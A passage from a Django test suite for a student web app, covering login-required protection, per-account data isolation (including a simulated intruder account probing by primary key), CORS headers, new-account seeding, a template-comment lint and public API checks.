        long_weekend_call = next(c for c in get.call_args_list if "LongWeekend" in c.args[0])
        self.assertEqual(long_weekend_call.kwargs["params"], {"availableBridgeDays": 2})
        self.assertTrue(long_weekend_call.args[0].endswith("/LongWeekend/2026/US"))

    def test_a_deadline_on_a_holiday_is_flagged_with_the_next_working_day(self, _get, _today):
        payload = self.client.get(reverse("api-deadline-holidays")).json()
        row = next(r for r in payload["results"] if r["title"] == "Needs item")
        self.assertTrue(row["is_holiday"])
        self.assertEqual(row["holiday_name"], "Thanksgiving Day")
        self.assertTrue(row["in_long_weekend"])
        self.assertEqual(row["long_weekend"]["day_count"], 4)
        self.assertTrue(row["at_risk"])
        # Thursday is the holiday; Friday is a weekday and not a holiday, so it is the next
        # working day, even though people bridging the long weekend may well be away.
        self.assertEqual(row["next_working_day"], "2026-11-27")
        self.assertEqual(row["working_days_lost"], 1)
        self.assertEqual(row["days_until_deadline"], 52)

    def test_an_ordinary_deadline_is_not_at_risk(self, _get, _today):
        payload = self.client.get(reverse("api-deadline-holidays")).json()
        row = next(r for r in payload["results"] if r["title"] == "FYI item")
        self.assertFalse(row["at_risk"])
        self.assertEqual(row["weekday"], "Wednesday")
        self.assertEqual(row["next_working_day"], "2026-10-14")
        self.assertEqual(row["nearest_holiday"]["name"], "Thanksgiving Day")
        self.assertEqual(row["nearest_holiday"]["days_from_deadline"], 43)

    def test_the_summary_aggregates_across_deadlines(self, _get, _today):
        summary = self.client.get(reverse("api-deadline-holidays")).json()["summary"]
        self.assertEqual(summary["deadlines_checked"], 2)
        self.assertEqual(summary["on_public_holiday"], 1)
        self.assertEqual(summary["at_risk"], 1)
        self.assertEqual(summary["share_at_risk"], 0.5)
        self.assertEqual(
            summary["next_holiday"],
            {"date": "2026-11-26", "name": "Thanksgiving Day", "days_from_today": 52},
        )

    def test_nothing_from_the_external_api_is_stored(self, _get, _today):
        before = {model: model.objects.count() for model in (BriefItem, Message, Brief, Person)}
        self.client.get(reverse("api-deadline-holidays"))
        self.assertEqual(before, {model: model.objects.count() for model in before})

    def test_bad_input_is_a_400_before_any_external_call(self, get, _today):
        for params in ({"country": "USA"}, {"country": "1"}, {"bridge_days": "x"},
                       {"bridge_days": "9"}):
            with self.subTest(params=params):
                response = self.client.get(reverse("api-deadline-holidays"), params)
                self.assertEqual(response.status_code, 400)
                self.assertIn("error", response.json())
        get.assert_not_called()

    def test_an_unknown_country_is_a_400(self, _get, _today):
        response = self.client.get(reverse("api-deadline-holidays"), {"country": "ZZ"})
        self.assertEqual(response.status_code, 400)

    def test_a_network_failure_is_a_502_not_a_crash(self, get, _today):
        get.side_effect = requests.exceptions.ConnectTimeout("timed out")
        response = self.client.get(reverse("api-deadline-holidays"))
        self.assertEqual(response.status_code, 502)
        self.assertIn("could not reach", response.json()["error"])

    def test_the_endpoint_is_linked_from_the_insights_page(self, _get, _today):
        html = self.client.get(reverse("insights")).content.decode()
        self.assertIn(f'action="{reverse("api-deadline-holidays")}"', html)


class CorsTests(SignedInClientMixin, TestCase):
    """The public endpoints can be read from another site (the Vega-Lite editor); pages cannot."""

    def test_api_and_chart_endpoints_allow_any_origin(self):
        for url in (reverse("api-items-by-lane"), reverse("api-insights"),
                    reverse("vega-chart-spec", args=["chart2"])):
            with self.subTest(url=url):
                self.assertEqual(self.client.get(url)["Access-Control-Allow-Origin"], "*")

    def test_html_pages_do_not(self):
        self.assertNotIn("Access-Control-Allow-Origin", self.client.get(reverse("home")))


class AuthenticationTests(TestCase):
    """
    Assignment 5, Part 1: the access boundary itself.

    The one class in this file that does NOT mix in SignedInClientMixin, because its subject
    is what happens to somebody who has not signed in. Everything else here assumes the door
    is locked; this is what checks the lock.

    Four things are asserted, in this order:

      1. every protected URL turns an anonymous visitor away, and serves a signed-in one
      2. the ONE public endpoint still answers 200 with no account, because Part 3 depends
         on it and a well-meaning "protect everything" sweep is exactly what would break it
      3. the navigation hides the protected links before login and shows them after
      4. log in, sign up and log out actually work, through the real forms

    On the redirect rather than a 401: Django's login_required answers an unauthenticated
    request with 302 to LOGIN_URL?next=..., including for a JSON endpoint. The assertions
    below never follow that redirect (fetch_redirect_response=False), because following it
    gives an HTML login page with status 200, which is what makes a curl check look like the
    endpoint is still wide open when it is not.

    Not asserted here, and deliberately so: per-user scoping. "Is anybody there" and "is this
    yours" are different questions, they fail in different ways, and a class that mixed them
    would be a class where a regression in one could be hidden by a passing assertion about
    the other. TenantIsolationTests, immediately below, is the second question on its own.
    """

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()
        cls.brief = cls.item.brief
        # The OWNER of those rows. It has to be: every assertion that a protected page opens
        # for a signed-in user is now also an assertion about whose rows come back, because
        # views.py scopes them. An account that owned nothing would get a 404 on the two
        # detail pages and an empty but perfectly valid 200 everywhere else.
        cls.user = demo_owner()

    # ---- the lists the loops below run over -----------------------------------------
    def protected_pages(self):
        """Every HTML page that shows data somebody wrote."""
        return [
            reverse("brief-list"),
            reverse("brief-detail", args=[self.brief.pk]),
            reverse("item-list-manual"),
            reverse("item-list-render"),
            reverse("item-list-cbv-base"),
            reverse("item-list-cbv-generic"),
            reverse("item-detail", args=[self.item.pk]),
            reverse("insights"),
            reverse("reports"),
            reverse("chart-lanes"),
            reverse("chart-providers"),
            reverse("vega-chart-page", args=["chart1"]),
            reverse("vega-chart-spec", args=["chart1"]),
            reverse("vega-chart-png", args=["chart1"]),
        ]

    def protected_apis(self):
        """Every endpoint that answers with data rather than a page. A5 Part 1.4."""
        return [
            reverse("api-items"),
            reverse("api-items-cbv"),
            reverse("api-insights"),
            reverse("api-messages-by-hour"),
            reverse("api-items-text"),
            reverse("api-items-csv"),
            reverse("export-items-csv"),
            reverse("export-items-json"),
            # Protected AND excluded from the signed-in loop below: reaching the view makes a
            # live call to Nager.Date. The anonymous half never gets that far, which is the
            # half this list is here for. ExternalApiTests covers the signed-in behaviour
            # with the network mocked.
            reverse("api-deadline-holidays"),
        ]

    # ---- 1. the boundary -------------------------------------------------------------
    def test_every_protected_page_sends_an_anonymous_visitor_to_the_login_page(self):
        login_url = reverse("login")
        for url in self.protected_pages() + self.protected_apis():
            with self.subTest(url=url):
                response = self.client.get(url)
                self.assertEqual(response.status_code, 302)
                self.assertRedirects(
                    response, f"{login_url}?next={quote(url)}",
                    fetch_redirect_response=False,
                )

    def test_a_protected_json_api_redirects_rather_than_crashing(self):
        """A5 Part 1.4 and Part 3: refused, not a 500, and not a page of data either."""
        for url in self.protected_apis():
            with self.subTest(url=url):
                response = self.client.get(url)
                self.assertIn(response.status_code, (301, 302, 401, 403))
                self.assertNotContains(
                    response, "Needs item", status_code=response.status_code
                )

    def test_every_protected_page_opens_for_a_signed_in_user(self):
        """The other half: protection that also blocks the owner is not protection."""
        self.client.force_login(self.user)
        apis = [url for url in self.protected_apis()
                if url != reverse("api-deadline-holidays")]
        for url in self.protected_pages() + apis:
            with self.subTest(url=url):
                self.assertEqual(self.client.get(url).status_code, 200)

    def test_the_login_required_decorator_covers_post_not_only_get(self):
        """
        The half-fix this guards against: a decorator on get() leaves post() open.

        Both of these were unauthenticated WRITES before A5 -- one creates a row, the other
        rewrites an item's state and its draft reply -- so the assertion is about the
        database, not about the status code.
        """
        before = self.brief.items.count()
        response = self.client.post(
            self.brief.get_absolute_url(),
            {"title": "Added by a stranger", "lane": "fyi", "rank": "9", "summary": "no"},
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(self.brief.items.count(), before)

        response = self.client.post(
            self.item.get_absolute_url(), {"state": "handled", "draft_body": "hijacked"}
        )
        self.assertEqual(response.status_code, 302)
        self.item.refresh_from_db()
        self.assertNotEqual(self.item.state, BriefItem.State.HANDLED)
        self.assertNotEqual(self.item.draft_body, "hijacked")

    # ---- 2. the one endpoint that must stay open -------------------------------------
    def test_the_public_feed_answers_200_while_logged_out(self):
        """
        Part 3 is built on this URL. If a future sweep protects it, this test is the alarm.
        """
        response = self.client.get(reverse("api-items-by-lane"))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/json")
        rows = response.json()
        self.assertEqual([row["lane"] for row in rows], ["needs_you", "moving", "fyi"])
        # Counts only. Nothing a person typed may appear in a response anybody can read.
        body = response.content.decode()
        for private in ("Needs item", "FYI item", "act on this", "Pat", "the receipt text"):
            with self.subTest(leak=private):
                self.assertNotIn(private, body)

    def test_the_public_feed_is_still_readable_cross_origin(self):
        """Without this header the Vega-Lite editor renders an empty chart."""
        response = self.client.get(reverse("api-items-by-lane"))
        self.assertEqual(response["Access-Control-Allow-Origin"], "*")

    def test_exactly_one_api_endpoint_is_public(self):
        """
        Counts the open doors instead of trusting that nobody added one.

        /api/insights/ and /api/insights/messages-by-hour/ are the two that look harmless and
        are not -- the first profiles behaviour day by day, the second hour by hour.
        """
        public = [url for url in self.protected_apis() + [reverse("api-items-by-lane")]
                  if self.client.get(url).status_code == 200]
        self.assertEqual(public, [reverse("api-items-by-lane")])

    # ---- 3. the navigation ------------------------------------------------------------
    def test_the_nav_hides_the_protected_links_before_login(self):
        html = self.client.get(reverse("home")).content.decode()
        for name in ("brief-list", "item-list-cbv-generic", "insights", "reports", "api-items"):
            with self.subTest(route=name):
                self.assertNotIn(f'href="{reverse(name)}"', html)
        self.assertIn(f'href="{reverse("login")}"', html)
        self.assertIn(f'href="{reverse("signup")}"', html)

    def test_the_nav_shows_them_after_login_with_the_username_and_a_logout_control(self):
        self.client.force_login(self.user)
        html = self.client.get(reverse("home")).content.decode()
        for name in ("brief-list", "item-list-cbv-generic", "insights", "reports", "api-items"):
            with self.subTest(route=name):
                self.assertIn(f'href="{reverse(name)}"', html)
        self.assertIn(TEST_USERNAME, html)
        # Log out is a POST form, not a link: Django 5's LogoutView answers 405 to GET.
        self.assertIn(f'action="{reverse("logout")}"', html)
        self.assertIn("csrfmiddlewaretoken", html)

    def test_home_stays_public_but_shows_a_stranger_no_data(self):
        """The front door: reachable logged out, and empty of anything private."""
        response = self.client.get(reverse("home"))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "unopsis/home.html")
        for private in ("Needs item", "Two things to look at."):
            with self.subTest(leak=private):
                self.assertNotContains(response, private)
        self.assertContains(response, "Log in")

    # ---- 4. the three views actually work ---------------------------------------------
    def test_the_login_and_signup_pages_are_reachable_logged_out_and_are_ours(self):
        for name, template in (("login", "registration/login.html"),
                               ("signup", "registration/signup.html")):
            with self.subTest(page=name):
                response = self.client.get(reverse(name))
                self.assertEqual(response.status_code, 200)
                self.assertTemplateUsed(response, template)
                # "Custom" means our frame, not Django's admin-styled default.
                self.assertTemplateUsed(response, "base.html")
                self.assertContains(response, "csrfmiddlewaretoken")
                self.assertContains(response, "unopsis.css")

    def test_login_url_setting_points_at_our_login_page(self):
        self.assertEqual(resolve_url(settings.LOGIN_URL), reverse("login"))
        self.assertEqual(resolve_url(settings.LOGIN_REDIRECT_URL), reverse("home"))
        self.assertEqual(resolve_url(settings.LOGOUT_REDIRECT_URL), reverse("home"))

    def test_a_correct_password_signs_the_user_in(self):
        response = self.client.post(
            reverse("login"), {"username": TEST_USERNAME, "password": TEST_PASSWORD}
        )
        self.assertRedirects(response, reverse("home"))
        self.assertEqual(int(self.client.session["_auth_user_id"]), self.user.pk)

    def test_a_wrong_password_does_not(self):
        response = self.client.post(
            reverse("login"), {"username": TEST_USERNAME, "password": "not-the-password"}
        )
        self.assertEqual(response.status_code, 200)       # re-rendered with the error
        self.assertNotIn("_auth_user_id", self.client.session)
        self.assertContains(response, "Please enter a correct")

    def test_logging_in_returns_the_visitor_to_the_page_they_asked_for(self):
        """The ?next= round trip: bounced off /reports/, sign in, land on /reports/."""
        bounced = self.client.get(reverse("reports"))
        self.assertEqual(bounced.status_code, 302)
        response = self.client.post(
            reverse("login"),
            {"username": TEST_USERNAME, "password": TEST_PASSWORD, "next": reverse("reports")},
        )
        self.assertRedirects(response, reverse("reports"))

    def test_signup_creates_an_account_and_signs_it_straight_in(self):
        response = self.client.post(
            reverse("signup"),
            {"username": "brand-new-person", "email": "new@example.invalid",
             "password1": TEST_PASSWORD, "password2": TEST_PASSWORD},
        )
        self.assertRedirects(response, reverse("home"))
        created = User.objects.get(username="brand-new-person")
        self.assertEqual(created.email, "new@example.invalid")
        self.assertEqual(int(self.client.session["_auth_user_id"]), created.pk)
        # And the account is immediately good for the thing accounts are for.
        self.assertEqual(self.client.get(reverse("api-items")).status_code, 200)

    def test_signup_enforces_the_password_validators_and_username_uniqueness(self):
        weak = self.client.post(
            reverse("signup"),
            {"username": "someone-else", "password1": "abc", "password2": "abc"},
        )
        self.assertEqual(weak.status_code, 200)
        self.assertFalse(User.objects.filter(username="someone-else").exists())

        taken = self.client.post(
            reverse("signup"),
            {"username": TEST_USERNAME, "password1": TEST_PASSWORD, "password2": TEST_PASSWORD},
        )
        self.assertEqual(taken.status_code, 200)
        self.assertEqual(User.objects.filter(username=TEST_USERNAME).count(), 1)

    def test_logout_ends_the_session_and_refuses_a_GET(self):
        self.client.force_login(self.user)
        # A GET logout would be firable from any <img src> on any site, so Django 5 refuses it.
        self.assertEqual(self.client.get(reverse("logout")).status_code, 405)
        self.assertIn("_auth_user_id", self.client.session)

        response = self.client.post(reverse("logout"), follow=True)
        self.assertRedirects(response, reverse("home"))
        self.assertNotIn("_auth_user_id", self.client.session)
        # The confirmation has to be added AFTER logout() flushes the session, or it is thrown
        # away with it and the user is signed out with no sign that anything happened. This
        # asserts the ordering in UnopsisLogoutView.post, which is silent when it is wrong.
        self.assertContains(response, "Signed out")
        # And the protection is back on immediately afterwards.
        self.assertEqual(self.client.get(reverse("reports")).status_code, 302)


class TenantIsolationTests(TestCase):
    """
    Assignment 5, the second half of Part 1: one signed-in account may not read or write
    another's rows.

    WHY THIS IS A SEPARATE CLASS FROM AuthenticationTests. Those two classes answer two
    questions that are easy to confuse and fail in completely different ways:

        AuthenticationTests    "is anybody there"   -- the anonymous visitor is turned away
        this class             "is this yours"      -- the signed-in stranger is turned away

    Only the first one has a symptom when it is missing. A site with authentication and no
    authorization looks locked, reads as locked in review, and passes every test in the class
    above -- while any account reads every other account's briefs, item titles, summaries,
    draft replies, contacts and message bodies. And because /accounts/signup/ is public, as
    the assignment requires it to be, "any account" means anybody who wants one: the boundary
    stops a stranger for exactly one HTTP request, the one where they sign up.

    So this class literally performs that attack. `intruder` signs up through the real public
    form -- not force_login, because the point is that the door it comes through is open --
    and then reaches for everything `victim` owns, by primary key, the way somebody who had
    read the URL scheme would.

    The assertions are deliberately of two kinds. Status codes alone would not be enough: a
    200 that happens to render an empty page is a pass, while a 200 that renders somebody
    else's item title is a catastrophe, and both are 200. So the READS assert on the response
    BODY (the victim's private strings must not appear in it) and the WRITES assert on the
    DATABASE (the victim's row must be unchanged afterwards), which are the two things that
    actually matter and the two things a status code cannot tell you.
    """

    # Strings that exist nowhere else in the fixture, so finding one in a response body is
    # unambiguous. "Did the page contain the word 'draft'" would be a test that passes by
    # accident; "did it contain VICTIM-DRAFT-REPLY" cannot.
    SECRETS = [
        "VICTIM-HEADLINE",
        "VICTIM-ITEM-TITLE",
        "VICTIM-SUMMARY",
        "VICTIM-DRAFT-REPLY",
        "VICTIM-CONTACT-NAME",
        "VICTIM-MESSAGE-BODY",
    ]

    @classmethod
    def setUpTestData(cls):
        now = timezone.now()
        cls.victim = User.objects.create_user("victim", password=TEST_PASSWORD)
        space = Space.objects.create(user=cls.victim, kind=Space.Kind.WORK)
        cls.brief = Brief.objects.create(
            space=space, window_start=now - timedelta(hours=4), window_end=now,
            trigger=Brief.Trigger.ON_DEMAND, status=Brief.Status.READY,
            headline="VICTIM-HEADLINE",
        )
        cls.item = BriefItem.objects.create(
            brief=cls.brief, title="VICTIM-ITEM-TITLE", lane=BriefItem.Lane.NEEDS_YOU,
            rank=1, summary="VICTIM-SUMMARY", draft_body="VICTIM-DRAFT-REPLY",
            deadline_at=now + timedelta(days=3),
        )
        connection = Connection.objects.create(
            space=space, provider="gmail", external_account="victim@example.invalid"
        )
        person = Person.objects.create(
            space=space, display_name="VICTIM-CONTACT-NAME",
            handles=["victim-contact@example.invalid"],
        )
        message = Message.objects.create(
            connection=connection, author=person, external_id="victim-m-1", sent_at=now,
            body="VICTIM-MESSAGE-BODY",
        )
        cls.item.messages.add(message)

    def setUp(self):
        super().setUp()
        # Through the real sign-up page, on purpose. force_login would prove the same thing
        # about the querysets while quietly skipping the fact that makes this matter: getting
        # an account on this site costs one POST and nobody's permission.
        response = self.client.post(
            reverse("signup"),
            {"username": "intruder", "email": "intruder@example.invalid",
             "password1": TEST_PASSWORD, "password2": TEST_PASSWORD},
        )
        self.assertEqual(response.status_code, 302, "signup must stay public: Part 1 asks for it")
        self.intruder = User.objects.get(username="intruder")
        self.assertIn("_auth_user_id", self.client.session)

    def assertNoSecretsIn(self, response, url):
        """No string only the victim could have written may appear in this body."""
        body = response.content.decode(errors="replace")
        for secret in self.SECRETS:
            with self.subTest(url=url, leak=secret):
                self.assertNotIn(secret, body)

    # ---- reads ------------------------------------------------------------------------
    def test_no_page_or_feed_hands_one_account_anothers_rows(self):
        """
        Every route that reads a row somebody wrote, in one loop.

        A loop rather than a test per URL because the failure mode is a view somebody added
        without the scoping, and a list is the only shape that makes adding the view and
        adding the assertion the same action.
        """
        urls = [
            reverse("home"),
            reverse("brief-list"),
            reverse("brief-detail", args=[self.brief.pk]),
            reverse("item-detail", args=[self.item.pk]),
            reverse("item-list-manual"),
            reverse("item-list-render"),
            reverse("item-list-cbv-base"),
            reverse("item-list-cbv-generic"),
            reverse("insights"),
            reverse("reports"),
            reverse("api-items"),
            reverse("api-items-cbv"),
            reverse("api-insights"),
            reverse("api-items-text"),
            reverse("api-items-csv"),
            reverse("api-messages-by-hour"),
            reverse("export-items-csv"),
            reverse("export-items-json"),
        ]
        for url in urls:
            with self.subTest(url=url):
                response = self.client.get(url)
                # 200 (scoped, so empty) and 404 (not yours, so it does not exist for you) are
                # both correct answers. A 500 is not, and neither is a 200 with the data in it.
                self.assertIn(response.status_code, (200, 404))
                self.assertNoSecretsIn(response, url)

    def test_a_detail_page_for_someone_elses_pk_is_a_404(self):
        """
        404, not 403, and the difference is deliberate.

        403 would confirm that /briefs/7/ exists and belongs to somebody -- which is itself a
        fact about another account, and enough to enumerate the table by walking the integers.
        Scoping the queryset gives 404 for free, because within this user's queryset that row
        genuinely does not exist.
        """
        self.assertEqual(
            self.client.get(reverse("brief-detail", args=[self.brief.pk])).status_code, 404
        )
        self.assertEqual(
            self.client.get(reverse("item-detail", args=[self.item.pk])).status_code, 404
        )

    def test_the_search_cannot_be_used_to_find_another_accounts_items(self):
        """The GET search is the obvious way to go looking rather than guessing a pk."""
        response = self.client.get(reverse("insights"), {"q": "VICTIM"})
        self.assertEqual(response.status_code, 200)
        self.assertNoSecretsIn(response, "insights?q=VICTIM")
        self.assertEqual(list(response.context["items"]), [])

    def test_the_private_lookup_is_not_a_directory_of_everybody(self):
        """
        The POST lookup takes a handle and answers with a name, every item citing them and ten
        message bodies. Unscoped, that is a people-search across every account on the site,
        driven by a string the searcher already has.
        """
        response = self.client.post(
            reverse("insights"), {"handle": "victim-contact@example.invalid"}
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context["lookup_ran"])
        self.assertNoSecretsIn(response, "insights POST lookup")
        self.assertEqual(response.context["lookup_results"]["people"], [])

    def test_an_api_filter_cannot_be_pointed_at_another_accounts_brief(self):
        """?brief=<their pk> is applied to the already-scoped queryset, so it matches nothing."""
        payload = self.client.get(reverse("api-items"), {"brief": self.brief.pk}).json()
        self.assertEqual(payload["count"], 0)
        self.assertEqual(payload["results"], [])

    def test_the_charts_and_totals_count_only_your_own_rows(self):
        """
        A count is still a disclosure. "You have 0 items" next to a site that has 400 of them
        says how busy somebody else is, and the home page used to print exactly that.
        """
        totals = dict(self.client.get(reverse("home")).context["totals"])
        mine = Brief.objects.filter(space__user=self.intruder).count()
        everyone = Brief.objects.count()
        self.assertEqual(totals["Briefs"], mine)
        self.assertLess(mine, everyone, "the fixture must contain a brief this user does not own")

        summaries = self.client.get(reverse("insights")).context["summaries"]
        self.assertEqual(summaries["total_items"],
                         BriefItem.objects.filter(brief__space__user=self.intruder).count())
        self.assertNotIn("VICTIM", json.dumps(summaries, default=str))

    # ---- writes -----------------------------------------------------------------------
    def test_one_account_cannot_create_an_item_on_anothers_brief(self):
        """
        BriefDetailView.post() resolves its target through get_queryset(), which is what makes
        this a 404 rather than a silent insert into somebody else's brief. Asserting on the
        row count rather than on the status code is the point: a view could answer 404 and
        write anyway, and the count is the only thing that notices.
        """
        before = self.brief.items.count()
        response = self.client.post(
            reverse("brief-detail", args=[self.brief.pk]),
            {"title": "INTRUDER-ADDED-THIS", "lane": "fyi", "rank": "9", "summary": "no"},
        )
        self.assertEqual(response.status_code, 404)
        self.assertEqual(self.brief.items.count(), before)
        self.assertFalse(BriefItem.objects.filter(title="INTRUDER-ADDED-THIS").exists())

    def test_one_account_cannot_rewrite_anothers_item(self):
        """Same shape for the update form: the database is the assertion, not the response."""
        response = self.client.post(
            reverse("item-detail", args=[self.item.pk]),
            {"state": "handled", "draft_body": "INTRUDER-OVERWROTE-THIS"},
        )
        self.assertEqual(response.status_code, 404)
        self.item.refresh_from_db()
        self.assertEqual(self.item.draft_body, "VICTIM-DRAFT-REPLY")
        self.assertEqual(self.item.state, BriefItem.State.OPEN)

    # ---- the owner still gets their own data ------------------------------------------
    def test_scoping_does_not_also_lock_the_owner_out(self):
        """
        The other half, and the half a too-eager fix breaks: protection that also turns the
        owner away is not protection, it is an outage. Everything the intruder could not see
        must still be there for the person it belongs to.
        """
        self.client.force_login(self.victim)
        response = self.client.get(reverse("brief-detail", args=[self.brief.pk]))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "VICTIM-ITEM-TITLE")
        detail = self.client.get(reverse("item-detail", args=[self.item.pk]))
        self.assertContains(detail, "VICTIM-DRAFT-REPLY")
        self.assertContains(detail, "VICTIM-MESSAGE-BODY")
        self.assertEqual(
            self.client.get(reverse("api-items")).json()["results"][0]["title"],
            "VICTIM-ITEM-TITLE",
        )


class NewAccountSeedingTests(TestCase):
    """
    Assignment 5: a brand-new account is given its OWN demo rows (unopsis/onboarding.py).

    This exists because the scoping above has a cost that is easy to ship without noticing.
    Before it, a new account saw the team's seeded data because every account saw every row;
    after it, a new account owns nothing and lands on a site with no briefs, no items and six
    zeroes. Nothing errors -- it just looks like the deployment failed. The account most
    likely to meet that page is the grader's, created the first time anybody clicks "Continue
    with Google" on the production domain.

    What these tests pin is the pair of properties that make the seeding a fix and not a
    second version of the leak: the new account gets rows, and they are ITS OWN rows.
    """

    def test_signing_up_leaves_the_new_account_with_something_to_look_at(self):
        self.client.post(
            reverse("signup"),
            {"username": "fresh", "email": "fresh@example.invalid",
             "password1": TEST_PASSWORD, "password2": TEST_PASSWORD},
        )
        fresh = User.objects.get(username="fresh")
        self.assertTrue(Space.objects.filter(user=fresh).exists())
        self.assertTrue(Brief.objects.filter(space__user=fresh).exists())
        self.assertTrue(BriefItem.objects.filter(brief__space__user=fresh).exists())

        # And the site it lands on is not an empty one.
        response = self.client.get(reverse("brief-list"))
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context["briefs"])

    def test_two_accounts_get_two_separate_sets_not_a_shared_one(self):
        """
        The failure this rules out is the tempting shortcut: showing everybody the demo
        owner's rows. That would pass the test above and be the original hole wearing a hat.
        """
        for name in ("alpha", "beta"):
            self.client.post(
                reverse("signup"),
                {"username": name, "email": f"{name}@example.invalid",
                 "password1": TEST_PASSWORD, "password2": TEST_PASSWORD},
            )
            self.client.post(reverse("logout"))

        alpha = User.objects.get(username="alpha")
        beta = User.objects.get(username="beta")
        alpha_spaces = set(Space.objects.filter(user=alpha).values_list("pk", flat=True))
        beta_spaces = set(Space.objects.filter(user=beta).values_list("pk", flat=True))
        self.assertTrue(alpha_spaces and beta_spaces)
        self.assertEqual(alpha_spaces & beta_spaces, set(), "the two accounts share a Space")

        self.client.force_login(alpha)
        titles = {row["title"] for row in self.client.get(reverse("api-items")).json()["results"]}
        self.assertTrue(titles)
        beta_titles = set(
            BriefItem.objects.filter(brief__space__user=beta).values_list("title", flat=True)
        )
        # The two sets have the same CONTENT (it is the same seed) but no shared rows, so the
        # check that means anything is on primary keys, not on strings.
        alpha_pks = set(
            BriefItem.objects.filter(brief__space__user=alpha).values_list("pk", flat=True)
        )
        beta_pks = set(
            BriefItem.objects.filter(brief__space__user=beta).values_list("pk", flat=True)
        )
        self.assertTrue(beta_titles)
        self.assertEqual(alpha_pks & beta_pks, set())

    @override_settings(SEED_NEW_ACCOUNTS=False)
    def test_the_seeding_can_be_switched_off_without_breaking_signup(self):
        """
        The switch has to be real, because the day this project holds data somebody cares
        about, handing every sign-up a pile of invented messages stops being hospitable.
        """
        response = self.client.post(
            reverse("signup"),
            {"username": "unseeded", "email": "unseeded@example.invalid",
             "password1": TEST_PASSWORD, "password2": TEST_PASSWORD},
        )
        self.assertRedirects(response, reverse("home"))
        unseeded = User.objects.get(username="unseeded")
        self.assertFalse(Space.objects.filter(user=unseeded).exists())
        # Signed in, and the site works -- it is simply empty, which is the whole point.
        self.assertEqual(self.client.get(reverse("brief-list")).status_code, 200)


class TemplateCommentTests(TestCase):
    """
    No template may use Django's {# ... #} comment across more than one line.

    This is a lint, not a behaviour test, and it is here because the bug it catches is one
    that cannot be seen in the source and is extremely visible on the page. Django's {# #} is
    SINGLE-LINE ONLY: a {# whose #} sits on a later line is not recognised as a comment at
    all, and the whole run of text -- an explanation written for the next developer -- is
    emitted verbatim into the HTML, where a visitor reads it.

    It landed on the login page, the sign-up page and the logged-out home page, which are
    precisely the three pages Assignment 5 is graded on. The multi-line form is
    {% comment %}...{% endcomment %}, and every file involved was already using it correctly
    for its header block, so the fix was to match the idiom already in the file.

    Checking every template rather than those three, because the next one to get this wrong
    will be whichever file somebody is writing next.
    """

    TEMPLATE_ROOT = Path(__file__).resolve().parent.parent / "templates"

    def test_no_template_opens_a_hash_comment_it_does_not_close_on_the_same_line(self):
        offenders = []
        for path in sorted(self.TEMPLATE_ROOT.rglob("*.html")):
            for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
                # Count openers and closers per line. A line may legitimately carry several
                # complete {# ... #} comments; what it may not do is end with one still open.
                if line.count("{#") != line.count("#}"):
                    offenders.append(
                        f"{path.relative_to(self.TEMPLATE_ROOT.parent)}:{number}: {line.strip()[:70]}"
                    )
        self.assertEqual(
            offenders, [],
            "multi-line {# #} is not a comment and renders as visible text; "
            "use {% comment %}...{% endcomment %}:\n" + "\n".join(offenders),
        )

    def test_the_three_graded_pages_render_no_template_comment_markup(self):
        """The same thing from the other end: what a visitor actually receives."""
        for url in (reverse("home"), reverse("login"), reverse("signup")):
            with self.subTest(url=url):
                body = self.client.get(url).content.decode()
                self.assertNotIn("{#", body)
                self.assertNotIn("#}", body)
                self.assertNotIn("{% comment %}", body)


class PublicApiSubmissionTests(TestCase):
    """
    Assignment 5, Part 3 -- the public API and the two things submitted alongside it.

    The class above proves the access boundary. This one proves the submission is CONSISTENT
    with it, which is a different failure and a quieter one. The assignment's own warning is
    the reason this file exists at all: if the field names in the Vega-Lite spec do not match
    the JSON keys the endpoint really returns, Vega-Lite raises nothing. It draws an empty
    chart. The instructor pastes the spec in, sees a blank canvas, and there is no error
    message anywhere to explain it.

    So the tests below read the actual submission files -- docs/a5/vega_lite_chart.txt and the
    three programs in docs/a5/alternative_uses/ -- and check them against the live view, not
    against a copy of what it used to return. Rename a key in items_by_lane_rows() and this
    suite fails here, loudly, long before anybody opens the editor.

    Nothing here is a test of Django. It is a test of the paperwork staying true, which is the
    part of an assignment that silently rots.
    """

    # The repository root: unopsis/tests.py -> unopsis/ -> the project. settings.BASE_DIR
    # would also work, but deriving it from __file__ keeps this independent of which settings
    # module the suite happens to be run with.
    REPO_ROOT = Path(__file__).resolve().parent.parent
    A5_DOCS = REPO_ROOT / "docs" / "a5"
    SPEC_FILE = A5_DOCS / "vega_lite_chart.txt"
    SCRIPT_DIR = A5_DOCS / "alternative_uses"
    SCRIPTS = [
        "01_python_aggregation.py",
        "02_csv_for_spreadsheets.py",
        "03_monitoring_check.py",
    ]

    # The one path the whole of Part 3 is built on. Written out literally rather than
    # reverse()d, because the submitted .txt file and the three scripts contain this string
    # and the point is to catch the day the route moves and they do not.
    PUBLIC_PATH = "/api/insights/items-by-lane/"

    def live_keys(self):
        """The JSON keys the public endpoint returns right now, from the running view."""
        rows = self.client.get(reverse("api-items-by-lane")).json()
        self.assertTrue(rows, "the feed must list every lane even when the table is empty")
        return set(rows[0])

    def submitted_specs(self):
        """
        Every Vega-Lite spec in the submitted .txt, pulled out the way a reader would.

        The file is a .txt with instructions above and below the JSON, because that is what
        the assignment asks to be handed in, so the specs are delimited by BEGIN/END markers
        that double as the "copy from here" line for the person pasting it into the editor.
        Extracting them the same way the instructions tell a human to extract them is the
        only way this test proves the file is usable rather than merely present.
        """
        text = self.SPEC_FILE.read_text(encoding="utf-8")
        blocks = re.findall(
            r"\(BEGIN VEGA-LITE SPEC\)[^\n]*\n(.*?)\n-----[^\n]*\(END VEGA-LITE SPEC\)",
            text,
            re.S,
        )
        self.assertEqual(len(blocks), 2,
                         "expected two specs: the production one and the localhost one")
        return [json.loads(block) for block in blocks]

    # ---- 1. the endpoint itself ------------------------------------------------------
    def test_the_public_endpoint_returns_clean_json_and_nothing_else(self):
        """
        Part 3.1: no login, no HTML, no wrapper object, and backed by the real tables.

        The "no wrapper" half is not pedantry. A spec whose data.url returns
        {"results": [...]} needs "format": {"property": "results"} or it charts nothing, so
        the shape of the top level is part of the contract with the submitted file.
        """
